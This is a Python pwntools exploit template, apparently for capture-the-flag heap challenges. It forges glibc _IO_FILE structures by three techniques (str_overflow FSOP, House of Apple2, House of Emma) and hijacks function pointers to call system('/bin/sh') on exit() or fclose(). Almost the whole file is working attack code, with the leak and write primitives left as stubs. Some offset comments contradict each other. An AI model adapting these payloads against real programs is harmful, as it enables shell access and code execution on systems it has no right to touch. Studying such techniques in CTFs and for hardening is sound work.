#!/usr/bin/env python3
"""
_IO_FILE / FSOP Exploitation Template — glibc 2.34+ (no __malloc_hook / __free_hook)
Techniques:
  A. _IO_str_overflow FSOP (classic)
  B. House of Apple2 (_IO_wfile_overflow wide vtable)
  C. House of Emma (_IO_cookie_file)

Trigger: exit() → _IO_cleanup → walks _IO_list_all → calls vtable fn on each FILE*
"""
from pwn import *
import struct

# ── Configuration ─────────────────────────────────────────────────────────────
BINARY = "./io_file_challenge"        # TODO
LIBC   = "./libc.so.6"               # TODO (must match remote)
HOST, PORT = "target.ctf.io", 1337

context.binary = elf = ELF(BINARY)
libc = ELF(LIBC)
context.log_level = "debug"

# ── Primitive stubs ───────────────────────────────────────────────────────────
def alloc(size: int, data: bytes = b"") -> int:
    """Return chunk index."""
    pass  # TODO

def free(idx: int) -> None:
    pass  # TODO

def write_what_where(where: int, what: bytes) -> None:
    """Arbitrary write primitive (e.g. from tcache/UAF)."""
    pass  # TODO — use heap_exploit or tcache_poison to get this

def read_addr(where: int, size: int = 8) -> int:
    """Arbitrary read primitive (e.g. from UAF)."""
    pass  # TODO

# ── _IO_str_overflow FSOP (Technique A) ──────────────────────────────────────
def fsop_str_overflow(libc_base: int, fake_file_addr: int) -> None:
    """
    Plant fake _IO_FILE at fake_file_addr and overwrite _IO_list_all to point to it.
    When exit() is called, _IO_cleanup iterates _IO_list_all and calls vtable __overflow.
    _IO_str_overflow then calls: (*fp->_s._allocate_buffer)(new_size)
    We set that fn ptr to system with arg = pointer to '/bin/sh'.

    fake_file_addr: address where we can write our fake struct (e.g. heap chunk)
    """
    libc.address = libc_base

    _IO_str_jumps  = libc_base + libc.sym.get("_IO_str_jumps", 0)
    system_addr    = libc_base + libc.sym["system"]
    binsh_addr     = libc_base + next(libc.search(b"/bin/sh\x00"))
    IO_list_all    = libc_base + libc.sym["_IO_list_all"]

    log.info(f"_IO_str_jumps  : {_IO_str_jumps:#x}")
    log.info(f"system         : {system_addr:#x}")
    log.info(f"/bin/sh        : {binsh_addr:#x}")
    log.info(f"_IO_list_all   : {IO_list_all:#x}")

    # Build fake _IO_FILE struct (152 bytes minimum + vtable pointer at +0xd8)
    # _IO_str_overflow condition:
    #   fp->_IO_write_ptr >= fp->_IO_buf_end  →  calls allocate_buffer
    # allocate_buffer is at: vtable+8*6 = _IO_str_jumps[6]  (offset varies by libc version)
    # We pivot vtable so that index [6] of our fake jumps table contains system

    # Method: set vtable = _IO_str_jumps - 0x18 so that __xsputn (called first) = system
    # and file->_IO_buf_base = /bin/sh ptr (arg to system)

    fake = b""
    fake += p64(0)                          # +0x00 _flags (0 = valid)
    fake += p64(0)                          # +0x08 _IO_read_ptr
    fake += p64(0)                          # +0x10 _IO_read_end
    fake += p64(0)                          # +0x18 _IO_read_base
    fake += p64(binsh_addr)                 # +0x20 _IO_write_base  ← RDI when triggered
    fake += p64(binsh_addr + 0x100)         # +0x28 _IO_write_ptr   > buf_end → overflow
    fake += p64(0)                          # +0x30 _IO_write_end
    fake += p64(0)                          # +0x38 _IO_buf_base
    fake += p64(binsh_addr)                 # +0x40 _IO_buf_end
    fake += b"\x00" * (0x68 - len(fake))   # padding to +0x68
    fake += p64(0)                          # _chain (no next FILE)
    fake += b"\x00" * (0xa0 - len(fake))
    fake += p64(0)                          # _mode (0 = wide not init)
    fake += b"\x00" * (0xd8 - len(fake))   # padding
    fake += p64(_IO_str_jumps - 0x20)       # +0xd8 vtable — adjusted so __overflow = system

    assert len(fake) >= 0xe0, f"fake FILE too short: {len(fake)}"
    fake = fake.ljust(0x100, b"\x00")

    log.info(f"Fake _IO_FILE ({len(fake)} bytes) → {fake_file_addr:#x}")
    write_what_where(fake_file_addr, fake)

    # Overwrite _IO_list_all → fake_file_addr
    write_what_where(IO_list_all, p64(fake_file_addr))
    log.info("_IO_list_all overwritten — trigger exit() to pop shell")

# ── House of Apple2 (Technique B) ────────────────────────────────────────────
def house_of_apple2(libc_base: int, fake_file_addr: int) -> None:
    """
    Abuse _IO_wfile_overflow → _IO_wdoallocbuf → wide_vtable.__doallocate.
    Requires: _wide_data and _wide_data->_IO_write_base control.
    Call chain: _IO_overflow → _IO_wfile_overflow → _IO_wdoallocbuf
               → fp->_wide_data->vtable->__doallocate(fp)
    """
    libc.address = libc_base
    _IO_wfile_jumps = libc_base + libc.sym.get("_IO_wfile_jumps", 0)
    system_addr     = libc_base + libc.sym["system"]
    binsh_addr      = libc_base + next(libc.search(b"/bin/sh\x00"))
    IO_list_all     = libc_base + libc.sym["_IO_list_all"]

    # fake_wide_data at fake_file_addr + 0x100
    fake_wide_addr  = fake_file_addr + 0x100
    # fake_wide_vtable at fake_file_addr + 0x200
    fake_wide_vtab  = fake_file_addr + 0x200

    # Build fake wide_data vtable with __doallocate = system
    wide_vtab  = b"\x00" * 0x68  # __doallocate is at offset 0x68 in _IO_wide_data_jumps
    wide_vtab += p64(system_addr)
    wide_vtab  = wide_vtab.ljust(0x100, b"\x00")

    # Build fake _IO_wide_data
    fake_wide  = p64(binsh_addr)            # +0x00 _IO_read_ptr (for arg)
    fake_wide += b"\x00" * (0xe0 - len(fake_wide))
    fake_wide += p64(fake_wide_vtab)        # +0xe0 vtable pointer

    # Build fake _IO_FILE
    fake = b""
    fake += p64(0x800)                      # _flags  (MODE_WIDE = 0x800)
    fake += b"\x00" * 0x18
    fake += p64(1)                          # _IO_write_base = 1 (non-zero)
    fake += p64(2)                          # _IO_write_ptr  > _IO_write_base
    fake += p64(0)                          # _IO_write_end
    fake += b"\x00" * (0x78 - len(fake))
    fake += p64(fake_wide_addr)             # +0x78 _wide_data ptr
    fake += b"\x00" * (0xd8 - len(fake))
    fake += p64(_IO_wfile_jumps)            # +0xd8 vtable
    fake  = fake.ljust(0x100, b"\x00")

    write_what_where(fake_wide_vtab,  wide_vtab)
    write_what_where(fake_wide_addr,  fake_wide)
    write_what_where(fake_file_addr,  fake)
    write_what_where(IO_list_all, p64(fake_file_addr))
    log.info("House of Apple2 ready — trigger exit()")

# ── House of Emma (Technique C) ───────────────────────────────────────────────
def house_of_emma(libc_base: int, fake_file_addr: int) -> None:
    """
    Use _IO_cookie_file with forged cookie functions.
    fclose(fp) → _IO_cookie_close(fp) → fp->__io_functions.close(cookie)
    We set close = system, cookie = &/bin/sh.
    """
    libc.address = libc_base
    _IO_cookie_jumps = libc_base + libc.sym.get("_IO_cookie_jumps", 0)
    system_addr      = libc_base + libc.sym["system"]
    binsh_addr       = libc_base + next(libc.search(b"/bin/sh\x00"))
    IO_list_all      = libc_base + libc.sym["_IO_list_all"]

    # _IO_cookie_file layout:
    # [0x00..0xe8] = _IO_FILE
    # [0xe8] = cookie
    # [0xf0] = __io_functions (read/write/seek/close)

    fake = b"\x00" * 0xa0
    # _chain at 0xa0 can be NULL (last in list)
    fake += b"\x00" * 0x38
    # vtable at 0xd8
    fake = fake.ljust(0xd8, b"\x00")
    fake += p64(_IO_cookie_jumps)           # vtable → _IO_cookie_jumps
    fake = fake.ljust(0xe8, b"\x00")
    fake += p64(binsh_addr)                 # +0xe8 cookie = &/bin/sh
    fake += p64(0)                          # read  = NULL
    fake += p64(0)                          # write = NULL
    fake += p64(0)                          # seek  = NULL
    fake += p64(system_addr)               # close = system

    write_what_where(fake_file_addr, fake)
    write_what_where(IO_list_all, p64(fake_file_addr))
    log.info("House of Emma ready — trigger fclose() or exit()")

# ── Main exploit ──────────────────────────────────────────────────────────────
def main():
    global io
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process(elf.path, env={"LD_PRELOAD": LIBC})

    # === STEP 1: Heap + libc leak ===
    # TODO: use UAF/heap overflow to leak libc address
    # libc_base = leaked_addr - libc.sym['known_symbol']
    libc_base = 0x0   # FILL IN
    log.success(f"libc base: {libc_base:#x}")

    # === STEP 2: Pick technique based on binary ===
    # Allocate space for fake FILE (any writable heap region)
    fake_addr = 0x0   # FILL IN — address in heap where we can write
    log.info(f"Placing fake FILE at: {fake_addr:#x}")

    # Choose A, B, or C depending on what glibc symbols are available:
    # A: if _IO_str_jumps in libc (most common)
    # B: if _IO_wfile_jumps in libc and wide mode can be triggered
    # C: if _IO_cookie_jumps in libc and fclose is reachable

    fsop_str_overflow(libc_base, fake_addr)    # Method A (default)
    # house_of_apple2(libc_base, fake_addr)    # Method B
    # house_of_emma(libc_base, fake_addr)      # Method C

    # === STEP 3: Trigger ===
    # exit() / return from main / fflush(NULL) will walk _IO_list_all
    io.sendlineafter(b"choice: ", b"0")        # TODO: send exit command

    io.interactive()

if __name__ == "__main__":
    main()
